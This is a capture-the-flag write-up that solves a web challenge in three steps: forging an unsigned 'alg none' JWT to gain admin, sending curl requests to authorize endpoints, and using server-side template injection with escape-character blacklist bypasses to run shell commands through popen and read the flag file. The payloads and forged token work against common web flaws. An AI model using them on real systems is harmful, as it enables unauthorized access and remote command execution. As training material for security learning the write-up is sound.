# Mercenary Hat Factory

## Solution

1. first, the server.py is provided, after analyze it, we can find there are three steps to get the flag 
2. Step 1 : 
    we have to let our account be admin, after register in the website, we can see in cookie, which is a jwt token, we can use jwt.io to decode, we get some thing like ****{ “type”: “user”, “user”: “tom”}****
    use python to get encoded string whose type is admin
    ```
    jwt.encode({ “type”: “admin”, “user”: “tom” },’’,algorithm=”none”)
    ```
    the string is 
    ```        
    b’eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ0eXBlIjoiYWRtaW4iLCJ1c2VyIjoibW9oIn0.’
    ```
    now we are level 1 user.
    ![](https://i.imgur.com/vCHaCxl.png)

3. Step 2 : 
    we have to let our account in authorizedAdmin, first set our previlegeCode, and enter
    ```
    curl -X POST http://challs.xmas.htsp.ro:11005/authorize?step=1 — data ‘privilegeCode=100’ -H ‘Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ0eXBlIjoiYWRtaW4iLCJ1c2VyIjoibW9oIn0.;Path=/;Domain=challs.xmas.htsp.ro’ -H ‘Content-Type: application/x-www-form-urlencoded’ ; 
    curl -X POST http://challs.xmas.htsp.ro:11005/authorize?step=2 — data ‘accessCode=72tom100100’ -H ‘Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ0eXBlIjoiYWRtaW4iLCJ1c2VyIjoibW9oIn0.;Path=/;Domain=challs.xmas.htsp.ro’ -H ‘Content-Type: application/x-www-form-urlencoded’
    ```
    now we are level 2 user
    ![](https://i.imgur.com/aJzqFa4.png)

    
4. Step3, we can try to use SSTI (server side template injection), first we can try 
    ```
    {{ ().__class__.__base__.__subclasses__() }}
    ```
    but we can see there's a filter to avoid SSTI attack  in server.py
    ```
    blacklist = [“config”, “self”, “request”, “[“, “]”, ‘“‘, “_”, “+”, “ “, “join”, “%”, “%25”]
    ```
    we can translate these words into escape characters to bypass. ex '_' to '\x5f'. After successfully inject, we can see these classes
    ```
    <class ‘warnings.WarningMessage’>
    <class ‘warnings.catch_warnings’>
    <class ‘subprocess.Popen’>
    <class ‘os._wrap_close’>
    ```
5. Finally, we can use the os._wrap_close class to execute shell code, first use 'ls -a' to see the files 
    ```
    {{()|attr(‘\x5f\x5fclass\x5f\x5f’)[]attr(‘\x5f\x5fbase\x5f\x5f’)|attr(‘\x5f\x5fsubclasses\x5f\x5f’)()|attr(‘\x5f\x5fgetitem\x5f\x5f’)(127)|attr(‘\x5f\x5finit\x5f\x5f’)|attr(‘\x5f\x5fglobals\x5f\x5f’)|attr(‘\u005f\u005fgetitem\u005f\u005f’)(‘popen’)(‘ls${IFS}-la’)|attr(‘read’)()}}
    ```
     ![](https://i.imgur.com/xxtYQQM.png)
     we can see there's unusual_flag.mp4 in the folder, then use
     ```
     {{()|attr(‘\x5f\x5fclass\x5f\x5f’)|attr(‘\x5f\x5fbase\x5f\x5f’)|attr(‘\x5f\x5fsubclasses\x5f\x5f’)()|attr(‘\x5f\x5fgetitem\x5f\x5f’)(127)|attr(‘\x5f\x5finit\x5f\x5f’)|attr(‘\x5f\x5fglobals\x5f\x5f’)|attr(‘\u005f\u005fgetitem\u005f\u005f’)(‘popen’)(‘base64<unusual\x5fflag.mp4’)|attr(‘read’)()}}
     ```
     new we can get the mp4 file, and flag is in the video.
     ![](https://i.imgur.com/p9jLNE6.png)

